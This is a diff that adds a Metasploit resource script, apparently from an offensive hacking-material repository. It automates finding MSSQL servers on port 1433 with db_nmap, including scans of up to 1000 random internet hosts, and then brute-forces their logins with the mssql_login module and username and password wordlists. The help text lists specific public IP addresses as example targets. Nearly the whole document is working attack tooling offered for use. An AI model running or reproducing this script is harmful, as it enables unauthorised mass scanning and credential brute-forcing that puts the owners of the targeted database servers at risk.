@@ -1,0 +1,141 @@
+   <ruby>
+      help = %Q|
+        Description:
+          setg RANDOM 1000 - Limit number of random rhosts to search
+          setg USER_FILE /root/users.txt - To instruct auxiliarys to use our own dicionary file
+          setg PASS_FILE /root/passwods.txt - To instruct auxiliarys to use our own dicionary file
+          setg RANDOM_HOSTS true - To instruct db_nmap to random search for hosts with port 1433 open
+          setg RHOSTS 185.99.212.190 180.86.155.12 - To instruct db_nmap to check targets for port 1433 open
+          mssql_brute will use nmap to search/check for port 1433 open, then it populates the msfdb with a
+          list of hosts found, and run auxiliary modules to gather info and brute force mssql services.
+          if none value (setg) has povided then this resource script will use is own default values.
+
+        Execute in msfconsole:
+          setg RANDOM <number-of-rhosts>
+          setg RANDOM_HOSTS <true-or-blank>
+          setg RHOSTS <hosts-separated-by-spaces>
+          setg USER_FILE <absoluct-path-of-dicionary.txt>
+          setg PASS_FILE <absoluct-path-of-dicionary.txt>
+          resource <path-to-script>/mssql_brute.rc
+
+        Author:
+          r00t-3xp10it  <pedroubuntu10[at]gmail.com>
+      |
+      print_line(help)
+      Rex::sleep(2.0)
+
+
+      if (framework.datastore['RANDOM_HOSTS'] == 'true')
+         if (framework.datastore['RANDOM'] == nil or framework.datastore['RANDOM'] == '')
+           run_single("setg RANDOM 1000")
+           print_line("RHOSTS => db_nmap -sV -Pn -T4 -O -p T:1433 --open -iR #{framework.datastore['RANDOM']} --script=ms-sql-info.nse")
+         else
+           print_line("RANDOM => #{framework.datastore['RANDOM']}")
+           print_line("RHOSTS => db_nmap -sV -Pn -T4 -O -p T:1433 --open -iR #{framework.datastore['RANDOM']} --script=ms-sql-info.nse")
+         end
+      elsif (framework.datastore['RHOSTS'] == nil or framework.datastore['RHOSTS'] == '')
+         run_single("setg RHOSTS 192.168.1.0/24")
+      elsif (framework.datastore['RHOSTS'])
+         print_line("RHOSTS => #{framework.datastore['RHOSTS']}")
+      end
+
+      if (framework.datastore['PASS_FILE'] == nil or framework.datastore['PASS_FILE'] == '')
+         run_single("setg PASS_FILE /usr/share/metasploit-framework/data/wordlists/password.lst")
+         nse_pass = "#{framework.datastore['PASS_FILE']}"
+      end
+      if (framework.datastore['USER_FILE'] == nil or framework.datastore['USER_FILE'] == '')
+         run_single("setg USER_FILE /usr/share/metasploit-framework/data/wordlists/default_users_for_services_unhash.txt")
+         nse_users = "#{framework.datastore['USER_FILE']}"
+      end
+
+      unless (framework.datastore['RANDOM_HOSTS'] == 'true')
+         run_single("db_nmap -sV -Pn -T4 -O -p T:1433 --open --script=ms-sql-info.nse #{framework.datastore['RHOSTS']}")
+      else
+         print_warning("db_nmap: search for random remote targets with port 1433 open (mssql)")
+         run_single("db_nmap -sV -Pn -T4 -O -p T:1433 --open -iR #{framework.datastore['RANDOM']} --script=ms-sql-info.nse")
+      end
+
+      run_single("spool /root/mssql_brute.log")
+      print_line("")
+      run_single("services")
+      print_good("Reading msfdb database for info.")
+      xhost = framework.db.hosts.map(&:address).join(' ')
+      xport = framework.db.services.map(&:port).join(' ')
+      proto = framework.db.services.map(&:proto).join(' ')
+      xname = framework.db.hosts.map(&:os_name).join(' ').gsub(' ',', ')
+
+      if xhost.nil? or xhost == ''
+           print_error("db_nmap scan did not find any alive connections.")
+           print_error("Please wait, cleaning recent configurations.")
+           Rex::sleep(1.0)
+           print_line("")
+           run_single("unsetg RHOSTS RANDOM_HOSTS USER_FILE PASS_FILE RANDOM")
+           File.delete('/root/mssql_brute.log')
+           return nil
+      elsif xport.nil? or xport == ''
+           print_error("db_nmap did not find any 1433 open ports.")
+           print_error("Please wait, cleaning recent configurations.")
+           Rex::sleep(1.0)
+           print_line("")
+           run_single("unsetg RHOSTS RANDOM_HOSTS USER_FILE PASS_FILE RANDOM")
+           File.delete('/root/mssql_brute.log')
+           run_single("services -d")
+           run_single("hosts -d")
+           return nil
+      end
+
+      unless (File.exist?(nse_pass))
+           print_error("[ERROR] Dicionary absoluct path not found.")
+           print_error("[ERROR] #{framework.datastore['PASS_FILE']}")
+           Rex::sleep(1.0)
+           print_warning("Please sellect the absoluct path of dicionary")
+           print_warning("Example: setg PASS_FILE /root/dicionary.txt")
+           print_error("Please wait, cleaning recent configurations.")
+           Rex::sleep(1.0)
+           print_line("")
+           run_single("unsetg RHOSTS RANDOM_HOSTS USER_FILE PASS_FILE RANDOM")
+           File.delete('/root/mssql_brute.log')
+           run_single("services -d")
+           run_single("hosts -d")
+           return nil
+      end
+
+      unless (File.exist?(nse_users))
+           print_error("[ERROR] Dicionary absoluct path not found.")
+           print_error("[ERROR] #{framework.datastore['USER_FILE']}")
+           Rex::sleep(1.0)
+           print_warning("Please sellect the absoluct path of dicionary")
+           print_warning("Example: setg USER_FILE /root/dicionary.txt")
+           print_error("Please wait, cleaning recent configurations.")
+           Rex::sleep(1.0)
+           print_line("")
+           run_single("unsetg RHOSTS RANDOM_HOSTS USER_FILE PASS_FILE RANDOM")
+           File.delete('/root/mssql_brute.log')
+           run_single("services -d")
+           run_single("hosts -d")
+           return nil
+      end
+
+      print_status("Operative systems: #{xname}")
+      run_single("setg RHOSTS #{xhost}")
+      Rex::sleep(2.0)
+      if xport =~ /1433/i or proto =~ /ms-sql-s/i or proto =~ /mssql/i or proto =~ /mssql-m/i
+           print_warning("Remote Target port 1433 mssql found")
+           Rex::sleep(1.0)
+           run_single("use auxiliary/scanner/mssql/mssql_ping")
+           run_single("setg THREADS 16")
+           run_single("exploit")
+           run_single("use auxiliary/scanner/mssql/mssql_login")
+           run_single("exploit")
+      end
+
+print_warning("please wait, Cleaning msfdb Database.")
+Rex::sleep(1.5)
+print_line("")
+run_single("unsetg RHOSTS THREADS RANDOM_HOSTS USER_FILE PASS_FILE RANDOM")
+print_line("")
+run_single("services -d")
+run_single("hosts -d")
+print_warning("Logfile stored under: /root/mssql_brute.log")
+print_status("https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md")
+</ruby>
